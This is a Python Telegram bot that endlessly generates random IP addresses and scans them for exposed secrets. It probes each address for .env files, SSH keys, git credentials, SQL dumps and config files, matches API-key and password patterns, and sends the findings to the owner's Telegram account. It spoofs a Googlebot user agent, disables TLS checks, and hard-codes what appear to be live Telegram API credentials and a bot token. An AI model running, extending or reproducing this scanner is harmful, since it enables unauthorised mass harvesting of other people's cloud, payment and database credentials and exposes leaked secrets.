import os
import ipaddress
import asyncio
import aiohttp
import aiofiles
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from faker import Faker
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode
import urllib3
import random
import time
from typing import List, Set, Dict, Tuple
import threading
import queue
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN = "8330545350:AAFrJJ5lfnkTHKkMYeFGeX1SxoV4wMvrlls"
OWNER_ID = 7125341830

# Constants
BATCH_SIZE = 10000
MAX_WORKERS = 500

# Comprehensive sensitive file paths to check
SENSITIVE_PATHS = [
    # Environment files
    '.env',
    '.env.local',
    '.env.production',
    '.env.development',
    '.env.staging',
    '.env.test',
    '.env.dev',
    '.env.uat',
    '.env.backup',
    '.env.example',
    '.env.sample',
    '.env.dist',
    'env',
    'environment',
    
    # Configuration files
    'config.env',
    'configuration.env',
    'settings.env',
    'credentials.env',
    'secrets.env',
    
    # Cloud service configs
    'aws.env',
    'azure.env',
    'gcp.env',
    'google.env',
    'firebase.env',
    'cloud.env',
    
    # Framework specific
    'laravel.env',
    'django.env',
    'flask.env',
    'rails.env',
    'spring.env',
    'node.env',
    
    # Database configs
    'database.env',
    'db.env',
    'mysql.env',
    'postgres.env',
    'mongodb.env',
    'redis.env',
    
    # API and service configs
    'api.env',
    'oauth.env',
    'stripe.env',
    'paypal.env',
    'twilio.env',
    'sendgrid.env',
    
    # Docker/Container
    'docker.env',
    'container.env',
    'k8s.env',
    
    # Backup files
    'env.bak',
    '.env.bak',
    'env.old',
    '.env.old',
    'env_backup',
    '.env_backup',
    
    # Hidden files
    '.envrc',
    '.secrets',
    '.credentials',
    '.config',
    
    # Web server configs
    '.htaccess',
    '.htpasswd',
    'web.config',
    'nginx.conf',
    'httpd.conf',
    
    # SSH and keys
    'id_rsa',
    'id_dsa',
    'ssh_config',
    'authorized_keys',
    'known_hosts',
    
    # Git files
    '.git/config',
    '.git/credentials',
    '.git-credentials',
    '.gitignore',
    
    # Database dumps
    'dump.sql',
    'backup.sql',
    'database.sql',
    'db_dump.sql',
    
    # Configuration files
    'config.php',
    'wp-config.php',
    'settings.py',
    'config.js',
    'appsettings.json',
    'application.properties',
    'application.yml',
    'bootstrap.yaml',
    
    # Sensitive data files
    'passwords.txt',
    'credentials.txt',
    'secrets.txt',
    'keys.txt',
    'tokens.txt',
    
    # API keys files
    'api_keys.json',
    'api_keys.txt',
    'apikeys.json',
    'apikeys.txt',
    
    # Certificate files
    '.pem',
    '.crt',
    '.key',
    '.p12',
    '.pfx',
    'cert.pem',
    'key.pem',
    
    # Package manager configs
    'composer.json',
    'package.json',
    'yarn.lock',
    'package-lock.json',
    'requirements.txt',
    'Pipfile',
    'Gemfile',
    
    # IDE configs
    '.vscode/settings.json',
    '.idea/workspace.xml',
    '.project',
    '.classpath',
    
    # Log files
    'error.log',
    'debug.log',
    'access.log',
    'application.log',
]

# Keywords to search for in found files (sensitive data patterns)
SENSITIVE_KEYWORDS = [
    # Database
    'DB_HOST=', 'DB_DATABASE=', 'DB_USERNAME=', 'DB_PASSWORD=', 'DATABASE_URL=',
    'MYSQL_ROOT_PASSWORD=', 'POSTGRES_PASSWORD=', 'MONGODB_URI=',
    
    # API Keys & Tokens
    'API_KEY=', 'API_SECRET=', 'API_TOKEN=', 'ACCESS_TOKEN=', 'SECRET_KEY=',
    'STRIPE_SECRET=', 'PAYPAL_SECRET=', 'TWILIO_AUTH_TOKEN=', 'SENDGRID_API_KEY=',
    'GITHUB_TOKEN=', 'GITLAB_TOKEN=', 'SLACK_TOKEN=', 'DISCORD_TOKEN=',
    'JWT_SECRET=', 'JWT_KEY=', 'ENCRYPTION_KEY=', 'MASTER_KEY=',
    
    # Cloud Services
    'AWS_ACCESS_KEY_ID=', 'AWS_SECRET_ACCESS_KEY=', 'AWS_SESSION_TOKEN=',
    'AZURE_STORAGE_CONNECTION_STRING=', 'AZURE_CLIENT_SECRET=',
    'GOOGLE_APPLICATION_CREDENTIALS=', 'GOOGLE_API_KEY=', 'GOOGLE_CLIENT_SECRET=',
    'FIREBASE_CREDENTIALS=', 'FIREBASE_API_KEY=',
    
    # Email
    'MAIL_HOST=', 'MAIL_USERNAME=', 'MAIL_PASSWORD=', 'SMTP_USERNAME=', 'SMTP_PASSWORD=',
    'EMAIL_HOST_PASSWORD=', 'EMAIL_HOST_USER=',
    
    # Authentication
    'AUTH0_CLIENT_SECRET=', 'OKTA_CLIENT_SECRET=', 'LDAP_PASSWORD=',
    'REDIS_PASSWORD=', 'RABBITMQ_PASSWORD=', 'ELASTICSEARCH_PASSWORD=',
    
    # Payment
    'STRIPE_PUBLISHABLE_KEY=', 'STRIPE_SECRET_KEY=', 'PAYPAL_CLIENT_SECRET=',
    'BRAINTREE_PRIVATE_KEY=', 'SQUARE_ACCESS_TOKEN=',
    
    # Social Media
    'FACEBOOK_APP_SECRET=', 'TWITTER_API_SECRET=', 'INSTAGRAM_ACCESS_TOKEN=',
    'LINKEDIN_CLIENT_SECRET=', 'PINTEREST_SECRET=',
    
    # Webhooks
    'WEBHOOK_SECRET=', 'SLACK_WEBHOOK_URL=', 'DISCORD_WEBHOOK_URL=',
    
    # Other sensitive
    'PASSWORD=', 'SECRET=', 'TOKEN=', 'KEY=', 'CREDENTIALS=', 'AUTH_TOKEN=',
    'PRIVATE_KEY=', 'PUBLIC_KEY=', 'CERTIFICATE=', 'ENCRYPTION_KEY=',
    'sk_live_', 'sk_test_', 'pk_live_', 'pk_test_', 'rk_live_',
    'ghp_', 'gho_', 'glpat-', 'xoxb-', 'xoxp-', 'xoxa-', 'xoxr-',
]

# Common ports to check
COMMON_PORTS = [80, 443, 8080, 8000, 3000, 5000, 7000, 9000]

class IPGenerator:
    """Handles IP generation and storage"""
    
    @staticmethod
    def generate_random_ips(count: int) -> List[str]:
        """Generate random IPs using Faker"""
        faker = Faker()
        return [faker.ipv4() for _ in range(count)]
    
    @staticmethod
    def generate_range_ips(start_ip: str, end_ip: str) -> List[str]:
        """Generate IPs within a range"""
        try:
            start = ipaddress.ip_address(start_ip)
            end = ipaddress.ip_address(end_ip)
            ips = []
            for ip in ipaddress.summarize_address_range(start, end):
                for addr in ipaddress.IPv4Network(ip):
                    ips.append(str(addr))
            return ips
        except Exception as e:
            print(f"Error generating range: {e}")
            return []
    
    @staticmethod
    def save_ips_to_disk(ips: List[str], filename: str) -> str:
        """Save IPs to disk and return file path"""
        filepath = f"data/{filename}"
        with open(filepath, 'w') as f:
            f.write('\n'.join(ips))
        return filepath
    
    @staticmethod
    def load_ips_from_disk(filepath: str) -> List[str]:
        """Load IPs from disk"""
        try:
            with open(filepath, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error loading IPs: {e}")
            return []

class EnhancedEnvScanner:
    """Enhanced scanner for .env files and other sensitive paths"""
    
    def __init__(self):
        self.session = None
        self.results_queue = queue.Queue()
        self.found_files = []
        self.scanned_count = 0
        self.found_count = 0
        
    async def init_session(self):
        """Initialize aiohttp session"""
        if not self.session:
            connector = aiohttp.TCPConnector(
                limit=MAX_WORKERS, 
                limit_per_host=50,
                ssl=False,
                force_close=True
            )
            timeout = aiohttp.ClientTimeout(total=8, connect=4)
            self.session = aiohttp.ClientSession(
                connector=connector, 
                timeout=timeout,
                headers={'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
            )
    
    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
    
    async def check_path(self, ip: str, port: int, path: str) -> dict:
        """Check a specific path on IP:port"""
        try:
            # Try HTTPS first, then HTTP
            protocols = ['https', 'http'] if port == 443 else ['http', 'https']
            
            for protocol in protocols:
                url = f'{protocol}://{ip}:{port}/{path.lstrip("/")}'
                try:
                    async with self.session.get(
                        url, 
                        ssl=False, 
                        allow_redirects=True,
                        max_redirects=2
                    ) as response:
                        if response.status in [200, 201, 202, 403, 401]:
                            text = await response.text()
                            
                            # Check for sensitive keywords
                            found_keywords = []
                            for keyword in SENSITIVE_KEYWORDS:
                                if keyword.lower() in text.lower() or keyword in text:
                                    found_keywords.append(keyword)
                            
                            if found_keywords or any(kw in text for kw in SENSITIVE_KEYWORDS):
                                return {
                                    'ip': ip,
                                    'port': port,
                                    'path': path,
                                    'url': url,
                                    'status': response.status,
                                    'size': len(text),
                                    'keywords': found_keywords[:10],  # Limit to first 10
                                    'content_preview': text[:1000],  # First 1000 chars
                                    'full_url': url
                                }
                except:
                    continue
                    
        except Exception:
            pass
        return None
    
    async def scan_ip_comprehensive(self, ip: str) -> List[dict]:
        """Comprehensive scan of an IP for all sensitive paths"""
        results = []
        
        # Check common ports
        for port in COMMON_PORTS:
            # Check all sensitive paths
            for path in SENSITIVE_PATHS:
                result = await self.check_path(ip, port, path)
                if result:
                    results.append(result)
                    
                    # If found .env, also check for common variations on same port
                    if 'env' in path:
                        variations = [
                            path + '.backup',
                            path + '.old',
                            path + '.bak',
                            path + '.save',
                            path.replace('.', '_') + '.txt',
                            path.replace('.', '') + '.txt',
                        ]
                        for var in variations:
                            var_result = await self.check_path(ip, port, var)
                            if var_result:
                                results.append(var_result)
        
        return results
    
    async def scan_batch(self, ips: List[str]) -> List[dict]:
        """Scan a batch of IPs concurrently"""
        await self.init_session()
        
        all_results = []
        batch_size = 100  # Process IPs in smaller batches to avoid overwhelming
        
        for i in range(0, len(ips), batch_size):
            batch = ips[i:i+batch_size]
            tasks = [self.scan_ip_comprehensive(ip) for ip in batch]
            batch_results = await asyncio.gather(*tasks)
            
            # Flatten results
            for ip_results in batch_results:
                if ip_results:
                    all_results.extend(ip_results)
                    self.found_count += len(ip_results)
            
            self.scanned_count += len(batch)
            
            # Small delay between batches
            if i + batch_size < len(ips):
                await asyncio.sleep(0.5)
        
        return all_results
    
    def save_results(self, results: List[dict]) -> str:
        """Save scan results to disk with detailed formatting"""
        if not results:
            return None
            
        timestamp = int(time.time())
        filename = f"results/sensitive_files_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"{'='*80}\n")
            f.write(f"SENSITIVE FILE SCAN RESULTS - {time.ctime()}\n")
            f.write(f"{'='*80}\n\n")
            f.write(f"Total Found: {len(results)}\n\n")
            
            # Group by IP
            ip_groups = {}
            for result in results:
                ip = result['ip']
                if ip not in ip_groups:
                    ip_groups[ip] = []
                ip_groups[ip].append(result)
            
            for ip, findings in ip_groups.items():
                f.write(f"\n{'='*80}\n")
                f.write(f"IP: {ip}\n")
                f.write(f"{'='*80}\n")
                
                for finding in findings:
                    f.write(f"\n  [*] URL: {finding['url']}\n")
                    f.write(f"      Port: {finding['port']}\n")
                    f.write(f"      Path: {finding['path']}\n")
                    f.write(f"      Status: {finding['status']}\n")
                    f.write(f"      Size: {finding['size']} bytes\n")
                    
                    if finding['keywords']:
                        f.write(f"      Keywords Found: {', '.join(finding['keywords'])}\n")
                    
                    f.write(f"\n      Content Preview:\n")
                    f.write(f"      {'-'*60}\n")
                    # Show first 10 lines of preview
                    preview_lines = finding['content_preview'].split('\n')[:10]
                    for line in preview_lines:
                        # Mask potential passwords in output
                        masked_line = line
                        for kw in ['PASSWORD', 'SECRET', 'KEY', 'TOKEN']:
                            if kw in masked_line.upper():
                                parts = masked_line.split('=', 1)
                                if len(parts) == 2:
                                    masked_line = f"{parts[0]}=********"
                        f.write(f"      {masked_line}\n")
                    f.write(f"\n")
            
            f.write(f"\n{'='*80}\n")
            f.write(f"SCAN COMPLETE - {time.ctime()}\n")
            f.write(f"{'='*80}\n")
        
        return filename

class AutoIPScanner:
    """Main bot class for automatic IP scanning"""
    
    def __init__(self, app: Client):
        self.app = app
        self.generator = IPGenerator()
        self.scanner = EnhancedEnvScanner()
        self.running = True
        self.current_batch = []
        self.batch_counter = 0
        self.scan_tasks = []
        
    async def generate_and_scan_loop(self):
        """Main loop: generate IPs and scan them"""
        print("Starting auto IP generation and scanning...")
        print(f"Checking {len(SENSITIVE_PATHS)} sensitive paths on {len(COMMON_PORTS)} ports")
        print(f"Monitoring {len(SENSITIVE_KEYWORDS)} sensitive keywords")
        
        while self.running:
            try:
                # Generate batch of IPs
                print(f"\n[Batch {self.batch_counter}] Generating {BATCH_SIZE} IPs...")
                ips = self.generator.generate_random_ips(BATCH_SIZE)
                
                # Save to disk
                batch_file = self.generator.save_ips_to_disk(ips, f"batch_{self.batch_counter}.txt")
                print(f"[Batch {self.batch_counter}] Saved to {batch_file}")
                
                # Scan batch
                print(f"[Batch {self.batch_counter}] Scanning with {MAX_WORKERS} workers...")
                start_time = time.time()
                results = await self.scanner.scan_batch(ips)
                scan_time = time.time() - start_time
                
                # Statistics
                print(f"[Batch {self.batch_counter}] Scan completed in {scan_time:.2f}s")
                print(f"[Batch {self.batch_counter}] Scanned: {self.scanner.scanned_count} IPs")
                print(f"[Batch {self.batch_counter}] Found: {len(results)} sensitive files")
                
                # Save results if found
                if results:
                    result_file = self.scanner.save_results(results)
                    print(f"[Batch {self.batch_counter}] Results saved to {result_file}")
                    
                    # Send results to owner
                    await self.notify_owner(results, result_file)
                
                # Clean up batch file
                try:
                    os.remove(batch_file)
                except:
                    pass
                
                self.batch_counter += 1
                
                # Small delay to prevent overwhelming the system
                await asyncio.sleep(0.5)
                
            except Exception as e:
                print(f"Error in scan loop: {e}")
                await asyncio.sleep(2)
    
    async def notify_owner(self, results: List[dict], result_file: str):
        """Send found sensitive files to owner"""
        try:
            # Group by IP for better reporting
            ip_count = len(set(r['ip'] for r in results))
            
            # Prepare message
            message = f"🔍 **Found {len(results)} sensitive files on {ip_count} IPs!**\n\n"
            
            # Show top findings
            file_types = {}
            for result in results:
                path = result['path']
                if path not in file_types:
                    file_types[path] = 0
                file_types[path] += 1
            
            message += "**Top findings:**\n"
            for path, count in sorted(file_types.items(), key=lambda x: x[1], reverse=True)[:5]:
                message += f"• `{path}`: {count} times\n"
            
            message += f"\n**Sample URLs:**\n"
            for result in results[:5]:
                message += f"• `{result['url']}`\n"
                if result.get('keywords'):
                    message += f"  Keywords: {', '.join(result['keywords'][:3])}\n"
            
            if len(results) > 5:
                message += f"\n*...and {len(results) - 5} more. Check the attached file.*"
            
            # Send message with file
            await self.app.send_message(
                OWNER_ID,
                message,
                parse_mode=ParseMode.MARKDOWN
            )
            
            # Send the result file
            await self.app.send_document(
                OWNER_ID,
                result_file,
                caption=f"Complete results: {len(results)} sensitive files from batch {self.batch_counter}"
            )
            
            # Also send a summary file with just URLs
            url_file = result_file.replace('.txt', '_urls.txt')
            with open(url_file, 'w') as f:
                for result in results:
                    f.write(f"{result['url']}\n")
                    if result.get('keywords'):
                        f.write(f"  Keywords: {', '.join(result['keywords'])}\n")
            
            await self.app.send_document(
                OWNER_ID,
                url_file,
                caption="URLs only (for easy access)"
            )
            
            # Clean up result files after sending
            try:
                os.remove(result_file)
                os.remove(url_file)
            except:
                pass
                
        except Exception as e:
            print(f"Error notifying owner: {e}")
    
    async def status_check(self):
        """Periodically send status updates to owner"""
        last_batch = 0
        last_found = 0
        
        while self.running:
            await asyncio.sleep(300)  # Every 5 minutes
            
            if self.batch_counter > last_batch or self.scanner.found_count > last_found:
                ips_scanned = self.batch_counter * BATCH_SIZE
                found_rate = (self.scanner.found_count / ips_scanned * 100) if ips_scanned > 0 else 0
                
                status = (
                    f"🤖 **Auto Scanner Status**\n\n"
                    f"🔄 Batches scanned: `{self.batch_counter}`\n"
                    f"🌐 IPs scanned: `{ips_scanned:,}`\n"
                    f"🔍 Sensitive files found: `{self.scanner.found_count}`\n"
                    f"📊 Success rate: `{found_rate:.4f}%`\n"
                    f"⚙️ Workers: `{MAX_WORKERS}`\n"
                    f"📁 Batch size: `{BATCH_SIZE}`\n"
                    f"🔎 Paths checked: `{len(SENSITIVE_PATHS)}`\n"
                    f"🎯 Keywords: `{len(SENSITIVE_KEYWORDS)}`\n"
                    f"🌍 Ports checked: `{len(COMMON_PORTS)}`\n"
                    f"✅ Status: `Running`"
                )
                
                try:
                    await self.app.send_message(OWNER_ID, status, parse_mode=ParseMode.MARKDOWN)
                    last_batch = self.batch_counter
                    last_found = self.scanner.found_count
                except Exception as e:
                    print(f"Error sending status: {e}")
    
    async def start(self):
        """Start all background tasks"""
        # Start main scanning loop
        scan_task = asyncio.create_task(self.generate_and_scan_loop())
        
        # Start status reporting
        status_task = asyncio.create_task(self.status_check())
        
        # Wait for tasks (they run forever)
        await asyncio.gather(scan_task, status_task)
    
    def stop(self):
        """Stop the scanner"""
        self.running = False

class PyroBot:
    """Main bot class using Pyrogram"""
    
    def __init__(self):
        self.app = Client(
            "auto_scanner_bot",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN
        )
        self.auto_scanner = None
        self.scanner_task = None
    
    async def start_auto_scanner(self):
        """Start the automatic scanner"""
        if not self.auto_scanner:
            self.auto_scanner = AutoIPScanner(self.app)
            self.scanner_task = asyncio.create_task(self.auto_scanner.start())
            return True
        return False
    
    async def stop_auto_scanner(self):
        """Stop the automatic scanner"""
        if self.auto_scanner:
            self.auto_scanner.stop()
            if self.scanner_task:
                self.scanner_task.cancel()
                try:
                    await self.scanner_task
                except asyncio.CancelledError:
                    pass
            self.auto_scanner = None
            return True
        return False
    
    async def run(self):
        """Run the bot"""
        
        @self.app.on_message(filters.command("start"))
        async def start_command(client, message: Message):
            await message.reply(
                f"🤖 **Advanced Auto Scanner Bot**\n\n"
                f"This bot automatically generates and scans IP addresses for sensitive files.\n\n"
                f"**Commands:**\n"
                f"/start - Show this message\n"
                f"/status - Check bot status\n"
                f"/stats - Show scanning statistics\n"
                f"/stop - Stop auto scanning\n"
                f"/restart - Restart auto scanning\n\n"
                f"**Configuration:**\n"
                f"• Batch size: `{BATCH_SIZE}` IPs\n"
                f"• Workers: `{MAX_WORKERS}`\n"
                f"• Sensitive paths: `{len(SENSITIVE_PATHS)}`\n"
                f"• Ports: `{len(COMMON_PORTS)}`\n"
                f"• Keywords: `{len(SENSITIVE_KEYWORDS)}`\n\n"
                f"**Found files include:**\n"
                f"• Environment files (.env, .env.local, etc.)\n"
                f"• Configuration files (config.json, settings.py, etc.)\n"
                f"• API keys, tokens, passwords\n"
                f"• Database credentials\n"
                f"• Cloud service credentials\n"
                f"• SSH keys and certificates\n\n"
                f"*Bot will send results automatically when found.*",
                parse_mode=ParseMode.MARKDOWN
            )
        
        @self.app.on_message(filters.command("status"))
        async def status_command(client, message: Message):
            if message.from_user.id != OWNER_ID:
                await message.reply("❌ Only the owner can use this command.")
                return
            
            if self.auto_scanner and self.auto_scanner.running:
                ips_scanned = self.auto_scanner.batch_counter * BATCH_SIZE
                found_rate = (self.auto_scanner.scanner.found_count / ips_scanned * 100) if ips_scanned > 0 else 0
                
                status = (
                    f"✅ **Auto Scanner is RUNNING**\n\n"
                    f"📊 Batches completed: `{self.auto_scanner.batch_counter}`\n"
                    f"🌐 Total IPs scanned: `{ips_scanned:,}`\n"
                    f"🔍 Files found: `{self.auto_scanner.scanner.found_count}`\n"
                    f"📈 Success rate: `{found_rate:.4f}%`\n"
                    f"⚙️ Workers: `{MAX_WORKERS}`\n"
                    f"🔎 Paths per IP: `{len(SENSITIVE_PATHS)}`\n"
                    f"🌍 Ports per IP: `{len(COMMON_PORTS)}`\n"
                    f"🔄 Status: `Active`"
                )
            else:
                status = "❌ **Auto Scanner is STOPPED**\n\nUse `/restart` to start scanning."
            
            await message.reply(status, parse_mode=ParseMode.MARKDOWN)
        
        @self.app.on_message(filters.command("stats"))
        async def stats_command(client, message: Message):
            if message.from_user.id != OWNER_ID:
                await message.reply("❌ Only the owner can use this command.")
                return
            
            # Count files in results directory
            result_files = len([f for f in os.listdir("results") if f.endswith('.txt')]) if os.path.exists("results") else 0
            
            stats = (
                f"📊 **Detailed Statistics**\n\n"
                f"🔄 Scans completed: `{self.auto_scanner.batch_counter if self.auto_scanner else 0}`\n"
                f"🌐 IPs processed: `{(self.auto_scanner.batch_counter * BATCH_SIZE) if self.auto_scanner else 0:,}`\n"
                f"🔍 Total findings: `{self.auto_scanner.scanner.found_count if self.auto_scanner else 0}`\n"
                f"📁 Results files saved: `{result_files}`\n"
                f"⚙️ Concurrent workers: `{MAX_WORKERS}`\n"
                f"📦 Batch size: `{BATCH_SIZE}`\n"
                f"🔎 Paths checked per IP: `{len(SENSITIVE_PATHS)}`\n"
                f"🌍 Ports checked per IP: `{len(COMMON_PORTS)}`\n"
                f"🎯 Keywords monitored: `{len(SENSITIVE_KEYWORDS)}`\n"
                f"📈 Total checks per batch: `{BATCH_SIZE * len(SENSITIVE_PATHS) * len(COMMON_PORTS):,}`"
            )
            
            await message.reply(stats, parse_mode=ParseMode.MARKDOWN)
        
        @self.app.on_message(filters.command("restart"))
        async def restart_command(client, message: Message):
            if message.from_user.id != OWNER_ID:
                await message.reply("❌ Only the owner can use this command.")
                return
            
            if self.auto_scanner:
                await self.stop_auto_scanner()
                await asyncio.sleep(2)
            
            await self.start_auto_scanner()
            await message.reply("✅ Auto scanner restarted successfully!")
        
        @self.app.on_message(filters.command("stop"))
        async def stop_command(client, message: Message):
            if message.from_user.id != OWNER_ID:
                await message.reply("❌ Only the owner can use this command.")
                return
            
            if self.auto_scanner and self.auto_scanner.running:
                await self.stop_auto_scanner()
                await message.reply("⏹️ Auto scanner stopped.")
            else:
                await message.reply("Auto scanner is not running.")
        
        # Start the bot and auto scanner
        await self.start_auto_scanner()
        
        print("🚀 Advanced Auto Scanner Bot started!")
        print(f"📊 Configuration:")
        print(f"   • Scanning {BATCH_SIZE} IPs per batch with {MAX_WORKERS} workers")
        print(f"   • Checking {len(SENSITIVE_PATHS)} sensitive paths")
        print(f"   • On {len(COMMON_PORTS)} common ports")
        print(f"   • Monitoring {len(SENSITIVE_KEYWORDS)} sensitive keywords")
        print(f"   • Total checks per batch: {BATCH_SIZE * len(SENSITIVE_PATHS) * len(COMMON_PORTS):,}")
        print("📁 Results will be sent to owner when found")
        
        # Run the bot
        await self.app.run()

async def main():
    """Main entry point"""
    bot = PyroBot()
    await bot.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
